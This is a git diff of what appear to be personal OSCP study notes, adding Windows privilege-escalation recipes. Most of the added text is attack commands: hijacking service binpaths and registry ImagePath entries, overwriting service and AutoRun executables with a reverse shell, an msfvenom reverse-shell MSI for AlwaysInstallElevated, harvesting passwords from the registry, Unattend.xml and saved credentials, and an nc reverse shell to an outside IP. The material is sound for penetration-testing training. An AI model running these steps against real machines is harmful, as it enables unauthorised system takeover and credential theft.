@@ -1134,9 +1134,9 @@ GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.176 7777"
 ```bash
 # Check if we can modify the "daclsvc" service
 .\accesschk.exe /accepteula -uwcqv user daclsvc
-# Check the current configuration of the service
+# Check the current configuration of the service(to see if we have to manually start the service or it does automatically)
 sc qc daclsvc
-# Check currnet status of the service
+# Check current status of the service
 sc query daclsvc
 # Reconfigure the service to use our reverse shell executable
 sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
@@ -1148,37 +1148,164 @@ net start daclsvc
 ```bash
 # Run winPEAS to check for service misconfigurations
 .\winPEASany.exe quiet servicesinfo
+
+# First let's check if we can start and stop the service
+.\accesschk.exe /accepteula -ucqv user unquotedsvc
+
 # Confirm this using sc
 sc qc unquotedsvc
-# Use accesschk.exe to check for write permissions:
+
+# Use accesschk.exe to check for write permissions on the path/directory:
 .\accesschk.exe /accepteula -uwdq C:\
 .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
 .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+
 # Copy the reverse shell executable and rename it appropriately
 copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+
 # Start a listener on Kali, and then start the service to trigger the exploit
 net start unquotedsvc
 ```
+
+### Windows Privesc: Weak Registry Permissions
+```bash
+# Run winPEAS to check for service misconfigurations:
+> .\winPEASany.exe quiet servicesinfo
+# Note that the “regsvc” service has a weak registry entry. We can confirm this with PowerShell:
+PS> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
+# Alternatively accesschk.exe can be used to confirm:
+> .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+
+# Check if we can start the service
+.\accesschk.exe /accepteula -ucqv user regsvc
+
+# Check current value
+reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc
+
+# Overwrite the ImagePath registry key to point to our reverse shell executable:
+> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+# Start a listener on Kali, and then start the service to trigger the exploit:
+> net start regsvc
+```
+
 
 ### Windows Privesc: Insecure Service Executables
 ```bash
 # Run winPEAS to check for service misconfigurations
 .\winPEASany.exe quiet servicesinfo
+
 # Note that the “filepermsvc” service has an executable which appears to be writable by everyone. We can confirm this with accesschk.exe
 .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+
+# Check if we can stop and start the service
+.\accesschk.exe /accepteula -uvqc filepermsvc
+
 # Create a backup of the original service executable
 copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\Temp
+
 # Copy the reverse shell executable to overwrite the service executable
 copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+
 # Start a listener on Kali, and then start the service to trigger the exploit
 net start filepermsvc
 ```
 
+### Windows Privesc: DLL Hijacking
+```bash
 
+```
+
+### Windows Privesc: AUTORUN
+![image](https://github.com/nuricheun/OSCP/assets/14031269/d21e2773-72aa-42c6-aa07-9d40f79f39f5)
+```bash
+# Use winPEAS to check for writable AutoRun executables:
+> .\winPEASany.exe quiet applicationsinfo
+# Alternatively, we could manually enumerate the AutoRun executables:
+> reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+# And then use accesschk.exe to verify the permissions on each one:
+> .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+# The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by Everyone. Create a backup of the original:
+> copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
+# Copy our reverse shell executable to overwrite the AutoRun executable:
+> copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
+# Start a listener on Kali, and then restart the Windows VM to trigger the exploit. Note that on 
+Windows 10, the exploit appears to run with the privileges of the last logged on user, so log 
+out of the “user” account and log in as the “admin” account first.
+```
+
+### Windows Privesc: AlwaysInstallElevated
+```bash
+1. Use winPEAS to see if both registry values are set:
+> .\winPEASany.exe quiet windowscreds
+2. Alternatively, verify the values manually:
+> reg query 
+HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+> reg query 
+HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:
+ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi
+# Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit:
+> msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+
+```
+
+### Windows Privesc: Searching the Registry for Passwords
+```bash
+# Use winPEAS to check common password locations:
+> .\winPEASany.exe quiet filesinfo userinfo
+(the final checks will take a long time to complete)
+# The results show both AutoLogon credentials and Putty session credentials for the admin user 
+(admin/password123)
+
+# We can verify these manually:
+> reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+# On Kali, we can use the winexe command to spawn a shell using these credentials:
+winexe -U 'admin%password123' //192.168.1.22 cmd.exe
+```
+
+### Windows Privesc: Savedas
+```bash
+# Use winPEAS to check for saved credentials:
+> .\winPEASany.exe quiet cmd windowscreds
+# It appears that saved credentials for the admin user exist.
+# We can verify this manually using the following command:
+> cmdkey /list
+# If the saved credentials aren’t present, run the following script to refresh the credential:
+> C:\PrivEsc\savecred.bat
+# We can use the saved credential to run any command as the admin user. Start a listener on Kali and run the reverse shell executable:
+> runas /savecred /user:admin C:\PrivEsc\reverse.exe
+```
+
+### Windows Privesc: Configuration Files
+```bash
+### MUANL CHECK
+#Recursively search for files in the current directory with “pass” in the name, or ending in “.config”:
+> dir /s *pass* == *.config
+#Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, or .txt:
+> findstr /si password *.xml *.ini *.txt
+
+### With winPEAS
+# Use winPEAS to search for common files which may contain credentials:
+> .\winPEASany.exe quiet cmd searchfast filesinfo
+# The Unattend.xml file was found. View the contents:
+> type C:\Windows\Panther\Unattend.xml
+# A password for the admin user was found. The password is Base64 encoded: cGFzc3dvcmQxMjM=
+# On Kali we can easily decode this:
+$ echo "cGFzc3dvcmQxMjM=" | base64 -d
+# Once again we can simply use winexe to spawn a shell as the admin user
+```
+### Windows Privesc: SAM
+```bash
+
+```
 
 
 ###wsgi
 ```bash
+pip3 install wsgidav
+mkdir /root/webdav
+locate wsgidav
 /usr/local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /root/webdav
 ```
 
